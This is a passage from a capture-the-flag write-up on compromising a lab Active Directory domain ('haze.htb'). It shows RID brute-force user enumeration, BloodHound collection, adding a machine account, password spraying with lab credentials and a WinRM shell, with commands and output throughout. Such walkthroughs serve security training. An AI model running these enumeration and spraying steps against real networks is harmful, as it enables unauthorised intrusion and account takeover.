445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 500: HAZE\Administrator (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 501: HAZE\Guest (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 502: HAZE\krbtgt (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 512: HAZE\Domain Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 513: HAZE\Domain Users (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 514: HAZE\Domain Guests (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 515: HAZE\Domain Computers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 516: HAZE\Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 517: HAZE\Cert Publishers (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 518: HAZE\Schema Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 519: HAZE\Enterprise Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 520: HAZE\Group Policy Creator Owners (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 521: HAZE\Read-only Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 522: HAZE\Cloneable Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 525: HAZE\Protected Users (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 526: HAZE\Key Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 527: HAZE\Enterprise Key Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 553: HAZE\RAS and IAS Servers (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 572: HAZE\Denied RODC Password Replication Group (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1000: HAZE\DC01$ (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1101: HAZE\DnsAdmins (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1102: HAZE\DnsUpdateProxy (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1103: HAZE\paul.taylor (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1104: HAZE\mark.adams (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1105: HAZE\edward.martin (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1106: HAZE\alexander.green (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1107: HAZE\gMSA_Managers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1108: HAZE\Splunk_Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1109: HAZE\Backup_Reviewers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1111: HAZE\Haze-IT-Backup$ (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 1112: HAZE\Support_Services (SidTypeGroup) </span></code></pre></div></div> <p>That’s a better list of users for sure. Something is odd with paul.taylor’s permissions.</p> <h4 id="bloodhound">Bloodhound</h4> <p>I’ll use <a href="https://github.com/g0h4n/RustHound-CE">rusthound-ce</a> (<code class="language-plaintext highlighter-rouge">cargo install rusthound-ce</code>):</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rusthound-ce <span class="nt">--domain</span> haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span> Ld@p_Auth_Sp1unk@2k24 <span class="nt">-c</span> All <span class="nt">--zip</span> <span class="go">--------------------------------------------------- Initializing RustHound-CE at 15:06:43 on 06/24/25 Powered by @g0h4n_0 --------------------------------------------------- [2025-06-24T15:06:43Z INFO rusthound_ce] Verbosity level: Info [2025-06-24T15:06:43Z INFO rusthound_ce] Collection method: All [2025-06-24T15:06:43Z INFO rusthound_ce::ldap] Connected to HAZE.HTB Active Directory! [2025-06-24T15:06:43Z INFO rusthound_ce::ldap] Starting data collection... [2025-06-24T15:06:43Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:06:44Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=haze,DC=htb [2025-06-24T15:06:44Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:06:45Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=haze,DC=htb [2025-06-24T15:06:45Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:06:46Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=haze,DC=htb [2025-06-24T15:06:46Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:06:47Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=haze,DC=htb [2025-06-24T15:06:47Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:06:47Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=haze,DC=htb [2025-06-24T15:06:47Z INFO rusthound_ce::json::parser] Starting the LDAP objects parsing... [2025-06-24T15:06:47Z INFO rusthound_ce::objects::domain] MachineAccountQuota: 10 ⢀ Parsing LDAP objects: 14% [2025-06-24T15:06:47Z INFO rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates [2025-06-24T15:06:47Z INFO rusthound_ce::json::parser] Parsing LDAP objects finished! [2025-06-24T15:06:47Z INFO rusthound_ce::json::checker] Starting checker to replace some values... [2025-06-24T15:06:47Z INFO rusthound_ce::json::checker] Checking and replacing some values finished! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 3 users parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 40 groups parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 1 computers parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 2 ous parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 3 domains parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 2 gpos parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 73 containers parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 1 ntauthstores parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 1 aiacas parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 1 rootcas parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 1 enterprisecas parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 33 certtemplates parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] 3 issuancepolicies parsed! [2025-06-24T15:06:47Z INFO rusthound_ce::json::maker::common] .//20250624150647_haze-htb_rusthound-ce.zip created! RustHound-CE Enumeration Completed at 15:06:47 on 06/24/25! Happy Graphing! </span></code></pre></div></div> <p>In general, this is better supported than the Python collector. I’ll upload the resulting archive to my local Bloodhound Docker and mark paul.taylor as owned.</p> <p>Paul has outbound control to Enroll in some certificates:</p> <picture> <source type="image/webp" srcset="/img/image-20250624111856433.webp" /> <img loading="lazy" src="/img/image-20250624111856433.png" alt="image-20250624111856433" class="include_image " /> </picture> <p>This isn’t that interesting, other than that the group that paul.taylor is a member is doesn’t have a name. It’s likely the Domain Users group, but it’s odd that the name doesn’t resolve.</p> <p>Looking at the raw <code class="language-plaintext highlighter-rouge">users.json</code> file, it’s clear that the data set is not complete:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nb">cat </span>20250624150647_haze-htb_users.json | jq <span class="nt">-r</span> <span class="s1">'.data[].Properties.name'</span> <span class="go">PAUL.TAYLOR@HAZE.HTB HAZE-IT-BACKUP$@HAZE.HTB NT AUTHORITY@HAZE.HTB </span></code></pre></div></div> <p>Something is weird with paul.taylor’s permissions.</p> <h3 id="alternative-user-enum">Alternative User Enum</h3> <p>The intended route is use the RID brute force to get the user list, and then password spray (the next step) using that list. Ippsec found a neat alternative:</p> <pre><code class="language-mermaid">flowchart TD; subgraph identifier[" "] direction LR start1[ ] ---&gt;|intended| stop1[ ] style start1 height:0px; style stop1 height:0px; start2[ ] ---&gt;|unintended| stop2[ ] style start2 height:0px; style stop2 height:0px; end A[&lt;a href='#validate'&gt;Auth as paul.taylor&lt;/a&gt;]--&gt;G(&lt;a href='#smb-user-enum'&gt;RID brute&lt;/a&gt;) G--&gt;B(&lt;a href='#password-spray'&gt;Password spray&lt;/a&gt;); B--&gt;C[&lt;a href='#shell'&gt;Shell as mark.adams&lt;/a&gt;]; C--&gt;D(&lt;a href='#enumeration-1'&gt;Full user enum /\nBloodhound&lt;/a&gt;); A--&gt;E(&lt;a href='#alternative-user-enum'&gt;Add computer&lt;/a&gt;); E--&gt;F(Early user full enum /\nBloodhound); F--&gt;B; linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none; linkStyle 1,6,7,8 stroke-width:2px,stroke:#4B9CD3,fill:none; style identifier fill:#1d1d1d,color:#FFFFFFFF; </code></pre> <p>The machine account quota is the default value of 10:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span> <span class="s1">'Ld@p_Auth_Sp1unk@2k24'</span> <span class="nt">-M</span> maq <span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.61 389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) </span><span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.61 389 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span><span class="nb">MAQ </span><span class="go"> 10.10.11.61 389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Getting the MachineAccountQuota </span><span class="nb">MAQ </span><span class="go"> 10.10.11.61 389 DC01 MachineAccountQuota: 10 </span></code></pre></div></div> <p>That means that each user can add up to 10 machines to the domain. I’ll do that:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>addcomputer.py <span class="nt">-computer-name</span> <span class="s1">'0xdf$'</span> <span class="nt">-computer-pass</span> <span class="s1">'0xdf0xdf!'</span> <span class="nt">-dc-host</span> haze.htb <span class="nt">-domain-netbios</span> haze <span class="s1">'haze/paul.taylor:Ld@p_Auth_Sp1unk@2k24'</span> <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Successfully added machine account 0xdf$ with password 0xdf0xdf!. </span></code></pre></div></div> <p>That account and authenticate:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb haze.htb <span class="nt">-u</span> <span class="s1">'0xdf$'</span> <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\0xdf$:0xdf0xdf! </span></code></pre></div></div> <p>And list all the users:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb haze.htb <span class="nt">-u</span> <span class="s1">'0xdf$'</span> <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span> <span class="nt">--users</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\0xdf$:0xdf0xdf! </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 -Username- -Last PW Set- -BadPW- -Description- </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 Administrator 2025-03-20 21:34:49 0 Built-in account for administering the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 Guest &lt;never&gt; 0 Built-in account for guest access to the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 krbtgt 2025-03-05 07:09:15 0 Key Distribution Center Service Account </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 paul.taylor 2025-06-26 05:35:27 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 mark.adams 2025-06-26 05:35:27 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 edward.martin 2025-06-26 05:35:27 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 alexander.green 2025-06-26 05:35:27 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated 7 local users: HAZE </span></code></pre></div></div> <p>I can also do a full Bloodhound collection. Regardless, I’ll still have to do a password spray next.</p> <h3 id="password-spray">Password Spray</h3> <p>I’ll use the RID bruteforce to make a list of usernames on the domain:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span> <span class="s1">'Ld@p_Auth_Sp1unk@2k24'</span> <span class="nt">--rid-brute</span> | <span class="nb">grep </span>SidTypeUser | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'\'</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> | <span class="nb">tee </span>domain_users <span class="go">Administrator Guest krbtgt DC01$ paul.taylor mark.adams edward.martin alexander.green Haze-IT-Backup$ </span></code></pre></div></div> <p>I’ll save the three passwords I have so far in a file as well, and spray these across all the usernames:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb haze.htb <span class="nt">-u</span> domain_users <span class="nt">-p</span> passwords <span class="nt">--continue-on-success</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Administrator:changeme STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Guest:changeme STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\krbtgt:changeme STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\DC01$:changeme STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\edward.martin:changeme STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\alexander.green:changeme STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Haze-IT-Backup$:changeme STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Administrator:password STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Guest:password STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\krbtgt:password STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\DC01$:password STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\edward.martin:password STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\alexander.green:password STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Haze-IT-Backup$:password STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>mark.adams shares the same password as paul.taylor!</p> <h3 id="shell">Shell</h3> <p>mark.adams can also WinRM:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm haze.htb <span class="nt">-u</span> mark.adams <span class="nt">-p</span> Ld@p_Auth_Sp1unk@2k24 <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.61 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.61 5985 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> </span></code></pre></div></div> <p>I’ll connect with <a href="https://github.com/adityatelange/evil-winrm-py">evil-winrm-py</a>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm-py <span class="nt">-i</span> haze.htb <span class="nt">-u</span> mark.adams <span class="nt">-p</span> Ld@p_Auth_Sp1unk@2k24 <span class="go"> ▘▜ ▘ █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌ ▙▖▚▘▌▐▖ ▚▚▘▌▌▌▌ ▌▌▌ ▙▌▙▌ ▌ ▄▌ v1.1.1 [*] Connecting to haze.htb:5985 as mark.adams </span><span class="gp">evil-winrm-py PS C:\Users\mark.adams\Documents&gt;</span><span class="w"> </span></code></pre></div></div> <h2 id="auth-as-haze-it-backup">Auth as Haze-IT-Backup</h2> <h3 id="enumeration-1">Enumeration</h3> <h4 id="filesystem">Filesystem</h4> <p>mark.adams’ home directory is very empty.</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\Users\mark.adams&gt;</span><span class="w"> </span><span class="n">tree</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="go">Folder PATH listing Volume serial number is 0000025F 3985:943C C:\USERS\MARK.ADAMS +---Desktop +---Documents +---Downloads +---Favorites +---Links +---Music +---Pictures +---Saved Games +---Videos </span></code></pre></div></div> <p>There are two other non-administrator users with home directories:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\Users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/4/2025 11:29 PM Administrator d----- 3/4/2025 11:46 PM alexander.green d----- 3/5/2025 5:49 PM edward.martin d----- 6/24/2025 4:31 PM mark.adams d-r--- 3/4/2025 11:00 PM Public </span></code></pre></div></div> <p>mark.adams doesn’t have access to any of them.</p> <p>There’s an interesting folder, <code class="language-plaintext highlighter-rouge">Backups</code> at the root of <code class="language-plaintext highlighter-rouge">C:</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/5/2025 12:32 AM Backups d----- 3/25/2025 2:06 PM inetpub d----- 5/8/2021 1:20 AM PerfLogs d-r--- 3/4/2025 11:28 PM Program Files d----- 5/8/2021 2:40 AM Program Files (x86) d-r--- 6/24/2025 4:31 PM Users d----- 3/25/2025 2:15 PM Windows </span></code></pre></div></div> <p>mark.adams can enter but not list:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="nx">Backups</span><span class="w"> </span><span class="gp">evil-winrm-py PS C:\Backups&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go">Access to the path 'C:\Backups' is denied. </span></code></pre></div></div> <h4 id="bloodhound-1">Bloodhound</h4> <p>mark.adams can list all the users on the domain:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb haze.htb <span class="nt">-u</span> mark.adams <span class="nt">-p</span> Ld@p_Auth_Sp1unk@2k24 <span class="nt">--users</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 -Username- -Last PW Set- -BadPW- -Description- </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 Administrator 2025-03-20 21:34:49 0 Built-in account for administering the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 Guest &lt;never&gt; 4 Built-in account for guest access to the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 krbtgt 2025-03-05 07:09:15 4 Key Distribution Center Service Account </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 paul.taylor 2025-06-24 04:42:30 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 mark.adams 2025-06-24 04:42:30 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 alexander.green 2025-06-24 04:42:30 3 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated 6 local users: HAZE </span></code></pre></div></div> <p>I’ll collect Bloodhound again:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rusthound-ce <span class="nt">--domain</span> haze.htb <span class="nt">-u</span> mark.adams <span class="nt">-p</span> Ld@p_Auth_Sp1unk@2k24 <span class="nt">-c</span> All <span class="nt">--zip</span> <span class="go">--------------------------------------------------- Initializing RustHound-CE at 15:36:13 on 06/24/25 Powered by @g0h4n_0 --------------------------------------------------- [2025-06-24T15:36:13Z INFO rusthound_ce] Verbosity level: Info [2025-06-24T15:36:13Z INFO rusthound_ce] Collection method: All [2025-06-24T15:36:14Z INFO rusthound_ce::ldap] Connected to HAZE.HTB Active Directory! [2025-06-24T15:36:14Z INFO rusthound_ce::ldap] Starting data collection... [2025-06-24T15:36:14Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:36:14Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=haze,DC=htb [2025-06-24T15:36:14Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:36:16Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=haze,DC=htb [2025-06-24T15:36:16Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:36:17Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=haze,DC=htb [2025-06-24T15:36:17Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:36:17Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=haze,DC=htb [2025-06-24T15:36:17Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*) [2025-06-24T15:36:17Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=haze,DC=htb [2025-06-24T15:36:17Z INFO rusthound_ce::json::parser] Starting the LDAP objects parsing... [2025-06-24T15:36:17Z INFO rusthound_ce::objects::domain] 